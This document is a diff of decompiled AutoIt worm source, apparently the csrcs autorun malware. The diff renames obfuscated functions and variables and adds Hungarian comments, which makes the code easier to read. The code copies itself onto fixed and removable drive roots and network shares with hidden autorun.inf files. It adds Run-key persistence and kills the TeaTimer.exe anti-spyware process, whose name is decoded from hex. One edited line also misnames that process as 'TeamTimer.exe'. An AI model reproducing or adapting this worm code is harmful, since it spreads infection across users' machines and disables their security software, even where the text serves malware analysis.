@@ -2240,9 +2240,9 @@ Func Fn009C()
 					$Var02CB = "none"
 					$Var02CC = "none"
 					Fn00A6()
-					Fn00A4()
-					Fn00A2()
-					Fn00A5()
+					DeleteFilesInFixedDriveRoots()
+					DeleteFilesInScriptDir()
+					DeleteFilesInRemovableDriveRoots()
 					Fn00A1()
 					Fn00A3()
 					Exit
@@ -2276,9 +2276,9 @@ Func Fn009C()
 					$Var02CB = "none"
 					$Var02CC = "none"
 					Fn00A6()
-					Fn00A4()
-					Fn00A2()
-					Fn00A5()
+					DeleteFilesInFixedDriveRoots()
+					DeleteFilesInScriptDir()
+					DeleteFilesInRemovableDriveRoots()
 					Fn00A1()
 					Fn00A3()
 					Exit
@@ -2322,9 +2322,9 @@ Func Fn009C()
 								$Var02CB = "none"
 								$Var02CC = "none"
 								Fn00A6()
-								Fn00A4()
-								Fn00A2()
-								Fn00A5()
+								DeleteFilesInFixedDriveRoots()
+								DeleteFilesInScriptDir()
+								DeleteFilesInRemovableDriveRoots()
 								Fn00A1()
 								Fn00A3()
 								Exit
@@ -2922,9 +2922,9 @@ Func Fn009C()
 			$Var02C8 = "W-remove"
 			$Var02CC = "none"
 			Fn00A6()
-			Fn00A4()
-			Fn00A2()
-			Fn00A5()
+			DeleteFilesInFixedDriveRoots()
+			DeleteFilesInScriptDir()
+			DeleteFilesInRemovableDriveRoots()
 			Fn00A1()
 			Fn00A3()
 			Exit
@@ -3008,7 +3008,7 @@ Func Fn009E()
 								EndIf
 							Next
 						Else
-							$Var02A8 = $Var02A7
+							$Var02A8 = $RandomFileName
 						EndIf
 						If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $CSRCSExeName) And FileExists($Var0414[$Var0350] & "\" & $AutoRunInfName) Then
 							$Var0416 = 0
@@ -3019,7 +3019,7 @@ Func Fn009E()
 							FileDelete($Var0414[$Var0350] & "\" & $Var02A9)
 							FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
 							FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
-							$Var02A8 = $Var02A7
+							$Var02A8 = $RandomFileName
 						EndIf
 						If $Var0416 = 1 Then
 							$Var0417 = @ScriptDir & "\"
@@ -3048,7 +3048,7 @@ Func Fn009E()
 		Next
 		$Var02AD = $Var0414[0]
 	EndIf
-	$Var02A8 = $Var02A7
+	$Var02A8 = $RandomFileName
 EndFunc
 
 Func Fn009F()
@@ -3102,7 +3102,7 @@ Func Fn009F()
 							EndIf
 						Next
 					Else
-						$Var02A8 = $Var02A7
+						$Var02A8 = $RandomFileName
 					EndIf
 					If FileGetVersion($Var0414[$Var0350] & "\" & $Var02A8) >= FileGetVersion(@ScriptDir & "\" & $CSRCSExeName) Then
 						$Var0416 = 0
@@ -3113,7 +3113,7 @@ Func Fn009F()
 						FileDelete($Var0414[$Var0350] & "\" & $Var02A9)
 						FileSetAttrib($Var0414[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
 						FileDelete($Var0414[$Var0350] & "\" & $AutoRunInfName)
-						$Var02A8 = $Var02A7
+						$Var02A8 = $RandomFileName
 					EndIf
 					If $Var0416 = 1 Then
 						$Var0417 = @ScriptDir & "\"
@@ -3141,7 +3141,7 @@ Func Fn009F()
 		Next
 		$Var02AD = $Var0414[0]
 	EndIf
-	$Var02A8 = $Var02A7
+	$Var02A8 = $RandomFileName
 EndFunc
 
 Func Fn00A0()
@@ -3156,7 +3156,10 @@ Func Fn00A0()
 EndFunc
 
 Func Fn00A1()
-	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	; TeaTimer.exe bezárása
+  ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	ProcessClose("TeaTimer.exe")
+
 	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CSRCSProcessName)
 	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CSRCSProcessName)
 	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CSRCSProcessName)
@@ -3165,27 +3168,33 @@ Func Fn00A1()
 	RegDelete($Var029A)
 EndFunc
 
-Func Fn00A2()
-	If FileExists(@ScriptDir & "\" & $AutoRunInfName) Then
+Func DeleteFilesInScriptDir()
+	; ha létezik a script mappájában autorun.inf, leveszi róla az attribútumokat és törli
+  If FileExists(@ScriptDir & "\" & $AutoRunInfName) Then
 		FileSetAttrib(@ScriptDir & "\" & $AutoRunInfName, "-RASHNOT")
 		FileDelete(@ScriptDir & "\" & $AutoRunInfName)
 	EndIf
-	If FileExists(@ScriptDir & "\" & $Var02A7) Then
-		FileSetAttrib(@ScriptDir & "\" & $Var02A7, "-RASHNOT")
-		FileDelete(@ScriptDir & "\" & $Var02A7)
+	; ha létezik a script mappájában a generált fájlnévvel fájl, leveszi róla az attribútumokat és törli
+  If FileExists(@ScriptDir & "\" & $RandomFileName) Then
+		FileSetAttrib(@ScriptDir & "\" & $RandomFileName, "-RASHNOT")
+		FileDelete(@ScriptDir & "\" & $RandomFileName)
 	EndIf
-	If FileExists(@ScriptDir & "\" & $CSRCSExeName) Then
+	; ha létezik a script mappájában csrcs.exe, leveszi róla az attribútumokat és törli
+  If FileExists(@ScriptDir & "\" & $CSRCSExeName) Then
 		FileSetAttrib(@ScriptDir & "\" & $CSRCSExeName, "-RASHNOT")
 		FileDelete(@ScriptDir & "\" & $CSRCSExeName)
 	EndIf
-	If FileExists(@SystemDir & "\" & $AutoRunInfName) Then
+	; ha létezik a windows\system32 mappában autorun.inf, leveszi róla az attribútumokat és törli
+  If FileExists(@SystemDir & "\" & $AutoRunInfName) Then
 		FileSetAttrib(@SystemDir & "\" & $AutoRunInfName, "-RASHNOT")
 		FileDelete(@SystemDir & "\" & $AutoRunInfName)
 	EndIf
-	If FileExists(@SystemDir & "\" & $Var02A7) Then
-		FileSetAttrib(@SystemDir & "\" & $Var02A7, "-RASHNOT")
-		FileDelete(@SystemDir & "\" & $Var02A7)
+	; ha létezik a windows\system32 mappában a generált fájlnévvel fájl, leveszi róla az attribútumokat és törli
+  If FileExists(@SystemDir & "\" & $RandomFileName) Then
+		FileSetAttrib(@SystemDir & "\" & $RandomFileName, "-RASHNOT")
+		FileDelete(@SystemDir & "\" & $RandomFileName)
 	EndIf
+  ; ha létezik a windows\system32 mappában csrcs.exe, leveszi róla az attribútumokat és törli
 	If FileExists(@SystemDir & "\" & $CSRCSExeName) Then
 		FileSetAttrib(@SystemDir & "\" & $CSRCSExeName, "-RASHNOT")
 		FileDelete(@SystemDir & "\" & $CSRCSExeName)
@@ -3203,54 +3212,63 @@ Func Fn00A3()
 	Exit
 EndFunc
 
-Func Fn00A4()
-	Sleep(0x0064)
-	$Var041A = DriveGetDrive("FIXED")
+Func DeleteFilesInFixedDriveRoots()
+	Sleep(0x0064) ; 100 ms = 0,1 s
+	$Drives = DriveGetDrive("FIXED") ; összes fix meghajtó lekérdezése
 	If Not @error Then
-		For $Var0350 = 1 To $Var041A[0]
-			If DriveStatus($Var041A[$Var0350]) = "READY" Then
-				If FileExists($Var041A[$Var0350] & "\" & $AutoRunInfName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $AutoRunInfName)
+    ; sikeres volt a lekérdezés
+		For $I = 1 To $Drives[0]
+			If DriveStatus($Drives[$I]) = "READY" Then
+        ; ha létezik a gyökérben autorun.inf, leveszi róla az attribútumokat és törli
+        If FileExists($Drives[$I] & "\" & $AutoRunInfName) Then
+					FileSetAttrib($Drives[$I] & "\" & $AutoRunInfName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $AutoRunInfName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $Var02A7) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
+        ; ha létezik a gyökérben a generált fájlnévvel fájl, leveszi róla az attribútumokat és törli
+				If FileExists($Drives[$I] & "\" & $RandomFileName) Then
+					FileSetAttrib($Drives[$I] & "\" & $RandomFileName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $RandomFileName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $CSRCSExeName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $CSRCSExeName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $CSRCSExeName)
+        ; ha létezik a gyökérben csrcs.exe, leveszi róla az attribútumokat és törli
+				If FileExists($Drives[$I] & "\" & $CSRCSExeName) Then
+					FileSetAttrib($Drives[$I] & "\" & $CSRCSExeName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $CSRCSExeName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $KHYFileName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $KHYFileName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $KHYFileName)
+        ; ha létezik a gyökérben khy, leveszi róla az attribútumokat és törli
+				If FileExists($Drives[$I] & "\" & $KHYFileName) Then
+					FileSetAttrib($Drives[$I] & "\" & $KHYFileName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $KHYFileName)
 				EndIf
 			EndIf
 		Next
 	EndIf
 EndFunc
 
-Func Fn00A5()
-	Sleep(0x0064)
-	$Var041A = DriveGetDrive("REMOVABLE")
+Func DeleteFilesInRemovableDriveRoots()
+	Sleep(0x0064) ; 100 ms = 0,1 s
+	$Drives = DriveGetDrive("REMOVABLE") ; összes hordozható meghajtó lekérdezése
 	If Not @error Then
-		For $Var0350 = 1 To $Var041A[0]
-			If DriveStatus($Var041A[$Var0350]) = "READY" Then
-				If FileExists($Var041A[$Var0350] & "\" & $AutoRunInfName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $AutoRunInfName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $AutoRunInfName)
+		For $I = 1 To $Drives[0]
+			If DriveStatus($Drives[$I]) = "READY" Then
+        ; ha létezik a gyökérben autorun.inf, leveszi róla az attribútumokat és törli
+				If FileExists($Drives[$I] & "\" & $AutoRunInfName) Then
+					FileSetAttrib($Drives[$I] & "\" & $AutoRunInfName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $AutoRunInfName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $Var02A7) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $Var02A7, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $Var02A7)
+        ; ha létezik a gyökérben a generált fájlnévvel fájl, leveszi róla az attribútumokat és törli
+				If FileExists($Drives[$I] & "\" & $RandomFileName) Then
+					FileSetAttrib($Drives[$I] & "\" & $RandomFileName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $RandomFileName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $CSRCSExeName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $CSRCSExeName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $CSRCSExeName)
+        ; ha létezik a gyökérben csrcs.exe, leveszi róla az attribútumokat és törli
+				If FileExists($Drives[$I] & "\" & $CSRCSExeName) Then
+					FileSetAttrib($Drives[$I] & "\" & $CSRCSExeName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $CSRCSExeName)
 				EndIf
-				If FileExists($Var041A[$Var0350] & "\" & $KHYFileName) Then
-					FileSetAttrib($Var041A[$Var0350] & "\" & $KHYFileName, "-RASHNOT")
-					FileDelete($Var041A[$Var0350] & "\" & $KHYFileName)
+        ; ha létezik a gyökérben khy, leveszi róla az attribútumokat és törli
+				If FileExists($Drives[$I] & "\" & $KHYFileName) Then
+					FileSetAttrib($Drives[$I] & "\" & $KHYFileName, "-RASHNOT")
+					FileDelete($Drives[$I] & "\" & $KHYFileName)
 				EndIf
 			EndIf
 		Next
@@ -3399,20 +3417,23 @@ Func Decrypt($Arg00, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
 EndFunc
 
 Func Fn00A9()
-	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	; TeaTimer.exe bezárása
+  ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	ProcessClose("TeamTimer.exe")
+
 	$Var0418 = @SystemDir & "\"
 	$Var0417 = @ScriptDir & "\"
 	Sleep(0x0064)
 	$Var0431 = 0
 	$Var0416 = 1
-	If FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) > FileGetVersion($Var0417 & $Var02A7) Then
+	If FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) > FileGetVersion($Var0417 & $RandomFileName) Then
 		$Var0416 = 0
 		If Not ProcessExists($CSRCSExeName) Then
 			ShellExecute($CSRCSExeName, "", $Var0418)
 			If @error Then
 			EndIf
 		EndIf
-	ElseIf FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) = FileGetVersion($Var0417 & $Var02A7) Then
+	ElseIf FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) = FileGetVersion($Var0417 & $RandomFileName) Then
 		$Var0416 = 0
 		If Not ProcessExists($CSRCSExeName) Then
 			$Var0416 = 1
@@ -3426,7 +3447,7 @@ Func Fn00A9()
 				ProcessWaitClose($CSRCSExeName, 0x003C)
 			EndIf
 		EndIf
-		Fn009D($Var0417, $Var02A7, $Var0418, $CSRCSExeName)
+		Fn009D($Var0417, $RandomFileName, $Var0418, $CSRCSExeName)
 		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 		Sleep(10)
 		Fn00B5($Var0418, $CSRCSExeName)
@@ -3454,7 +3475,9 @@ Func Fn00A9()
 EndFunc
 
 Func Fn00AA()
-	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	; TeaTimer.exe bezárása
+  ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	ProcessClose("TeaTimer.exe")
 	$Var0418 = @SystemDir & "\"
 	$Var0417 = @ScriptDir & "\"
 	Sleep(0x0064)
@@ -3468,7 +3491,7 @@ Func Fn00AA()
 				ProcessWaitClose($CSRCSExeName, 0x003C)
 			EndIf
 		EndIf
-		Fn009D($Var0417, $Var02A7, $Var0418, $CSRCSExeName)
+		Fn009D($Var0417, $RandomFileName, $Var0418, $CSRCSExeName)
 		Fn00B5($Var0418, $CSRCSExeName)
 		Sleep(10)
 		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
@@ -3947,18 +3970,18 @@ Func Fn00B0($Arg00)
 						If FileExists($Var0418 & "System Volume Information") Or FileExists($Var0418 & "RECYCLER") Or FileExists($Var0418 & "Recycled") Then
 							Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 							Sleep(10)
-							Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A7)
+							Fn009D($Var0417, $CSRCSExeName, $Var0418, $RandomFileName)
 							Sleep(10)
 							$Var02C8 = "todrive"
 						Else
-							Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A7)
-							FileSetAttrib($Var0418 & $Var02A7, "-RASH")
+							Fn009D($Var0417, $CSRCSExeName, $Var0418, $RandomFileName)
+							FileSetAttrib($Var0418 & $RandomFileName, "-RASH")
 							Sleep(10)
 							$Var02C8 = "toshare"
 						EndIf
 						FileWrite($Var0418 & $KHYFileName, "")
 						FileSetAttrib($Var0418 & $KHYFileName, "+RASH")
-						If FileExists($Var0418 & $Var02A7) And FileGetVersion($Var0418 & $Var02A7) = FileGetVersion($Var0417 & $CSRCSExeName) Then
+						If FileExists($Var0418 & $RandomFileName) And FileGetVersion($Var0418 & $RandomFileName) = FileGetVersion($Var0417 & $CSRCSExeName) Then
 							$Var034E = $Var0336
 							$Var02CA = $Var0418
 							$Var02CB = "none"
@@ -5495,9 +5518,9 @@ $Var02A4 = ""
 $Var02A5 = "-"
 $Var02A6 = "-"
 ; 6 karakter hosszú véletlen elnevezésű exe
-$Var02A7 = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
-$Var02A8 = $Var02A7
-$Var02A9 = $Var02A7
+$RandomFileName = Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & Chr(Random(Asc("a"), Asc("z"), 1)) & ".exe"
+$Var02A8 = $RandomFileName
+$Var02A9 = $RandomFileName
 $Var02AA = 0
 $Var02AB = 0
 $Var02AC = 0
@@ -5627,16 +5650,20 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
 		EndIf
 	EndIf
 
-	Fn00A4()
-	Fn00A2()
-	$Var02A7 = $CFTUExeName
+	DeleteFilesInFixedDriveRoots()
+	DeleteFilesInScriptDir()
+	$RandomFileName = $CFTUExeName
 	Fn00AA()
-	Sleep(10 * 0x03E8)
-	Sleep(10 * 0x003C * 0x03E8)
+	Sleep(10 * 0x03E8) ; 10 * 1000 = 10 000 ms = 10 s
+	Sleep(10 * 0x003C * 0x03E8) ; 10 * 60 * 1000 = 60 000 ms = 60 s = 1 m
+
 	If ProcessExists($CSRCSExeName) Then
 		If FileGetVersion(@SystemDir & "\" & $CFTUExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
-				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+				; TeaTimer.exe bezárása
+        ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+        ProcessClose("TeaTimer.exe")
+
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUProcessName2)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUProcessName2)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUProcessName2)
@@ -5647,14 +5674,20 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUExeName
 	Exit
 EndIf
 If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeName Then
-	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	; TeaTimer.exe bezárása
+  ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+	ProcessClose("TeaTimer.exe")
+
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName, "REG_SZ", @SystemDir & "\" & $CFTUONExeName)
 	If ProcessExists($CSRCSExeName) Then
 		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
-				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+        ; TeaTimer.exe bezárása
+        ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+        ProcessClose("TeaTimer.exe")
+
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
@@ -5683,16 +5716,19 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
 			ProcessWaitClose("net.exe", 0x003C)
 		EndIf
 	EndIf
-	Fn00A4()
-	Fn00A2()
-	$Var02A7 = $CFTUONExeName
+	DeleteFilesInFixedDriveRoots()
+	DeleteFilesInScriptDir()
+	$RandomFileName = $CFTUONExeName
 	Fn00A9()
 	Sleep(10 * 0x03E8)
 	Sleep(10 * 0x003C * 0x03E8)
 	If ProcessExists($CSRCSExeName) Then
 		If FileGetVersion(@SystemDir & "\" & $CFTUONExeName) <= FileGetVersion(@SystemDir & "\" & $CSRCSExeName) Then
 			If RegRead($Var029A, "exp1") <> "" Then
-				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+        ; TeaTimer.exe bezárása
+        ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
+        ProcessClose("TeaTimer.exe")
+
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CFTUONProcessName)
 				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CFTUONProcessName)
@@ -5702,16 +5738,19 @@ If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $CFTUONExeNa
 	EndIf
 	Exit
 EndIf
-If @ScriptDir = @SystemDir Then
-EndIf
+
+; üres if
+;If @ScriptDir = @SystemDir Then
+;EndIf
+
 If @ScriptDir = @SystemDir Then
 	If CreateMutex("df8g1sdf68g18er1g8re16", 1) = 0 Then
 		Exit
 	EndIf
 	Fn00EB()
-	$Var033F = $KHYFileName & "!" & $Var02A7
+	$Var033F = $KHYFileName & "!" & $RandomFileName
 	$Var033F = Decrypt(1, $Var033F, $EncryptionKey, 1)
-	$Var02A8 = $Var02A7
+	$Var02A8 = $RandomFileName
 EndIf
 If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
 	$Var0340 = FileGetVersion(@SystemDir & "\" & $CSRCSExeName)
@@ -5719,18 +5758,18 @@ If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir 
 	If ProcessExists($CSRCSExeName) Then
 		If $Var0341 > $Var0340 Then
 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-			$Var02A7 = StringMid(@AutoItExe, $Var0342)
+			$RandomFileName = StringMid(@AutoItExe, $Var0342)
 			Fn00A9()
 			Sleep(0x03E8)
 		EndIf
 	Else
 		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-		$Var02A7 = StringMid(@AutoItExe, $Var0342)
+		$RandomFileName = StringMid(@AutoItExe, $Var0342)
 		Fn00A9()
 		Sleep(0x03E8)
 	EndIf
 	If DriveGetType(@ScriptDir) = "FIXED" Then
-		Fn00A4()
+		DeleteFilesInFixedDriveRoots()
 		Fn00A3()
 		Exit
 	EndIf
@@ -5744,12 +5783,12 @@ ElseIf @ScriptDir = @SystemDir Then
 		$Var0343 = FileReadLine(@ScriptDir & "\" & $AutoRunInName, 9)
 		$Var0344 = FileReadLine(@ScriptDir & "\" & $AutoRunIName, 9)
 		If $Var0343 <> $Var0344 Then
-			Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
-			Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
+			Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey)
+			Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 		EndIf
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
-		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
+		Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey)
+		Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 	EndIf
 	If FileExists(@ScriptDir & "\" & $AutoRunInName) Then
 		$Var0345 = FileReadLine(@ScriptDir & "\" & $AutoRunInName, 9)
@@ -5760,16 +5799,16 @@ ElseIf @ScriptDir = @SystemDir Then
 			If $Var0345[0] = 2 Then
 				If $Var0345[1] = $KHYFileName Then
 					$Var02A8 = $Var0345[2]
-					$Var02A7 = $Var0345[2]
+					$RandomFileName = $Var0345[2]
 				Else
-					Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
+					Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey)
 				EndIf
 			Else
-				Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
+				Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey)
 			EndIf
 		Next
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey)
+		Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey)
 	EndIf
 	If FileExists(@ScriptDir & "\" & $AutoRunIName) Then
 		$Var0345 = FileReadLine(@ScriptDir & "\" & $AutoRunIName, 9)
@@ -5780,16 +5819,16 @@ ElseIf @ScriptDir = @SystemDir Then
 			If $Var0345[0] = 2 Then
 				If $Var0345[1] = $KHYFileName Then
 					$Var02A8 = $Var0345[2]
-					$Var02A7 = $Var0345[2]
+					$RandomFileName = $Var0345[2]
 				Else
-					Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
+					Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 				EndIf
 			Else
-				Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
+				Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 			EndIf
 		Next
 	Else
-		Fn00BB(@ScriptDir, $Var02A7, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
+		Fn00BB(@ScriptDir, $RandomFileName, $KHYFileName, $EncryptionKey, "rem", $Var02A3)
 	EndIf
 Else
 	$Var0340 = FileGetVersion(@SystemDir & "\" & $CSRCSExeName)
@@ -5797,13 +5836,13 @@ Else
 	If ProcessExists($CSRCSExeName) Then
 		If $Var0341 > $Var0340 Then
 			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-			$Var02A7 = StringMid(@AutoItExe, $Var0342)
+			$RandomFileName = StringMid(@AutoItExe, $Var0342)
 			Fn00A9()
 			Sleep(0x03E8)
 		EndIf
 	Else
 		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
-		$Var02A7 = StringMid(@AutoItExe, $Var0342)
+		$RandomFileName = StringMid(@AutoItExe, $Var0342)
 		Fn00A9()
 		Sleep(0x03E8)
 	EndIf
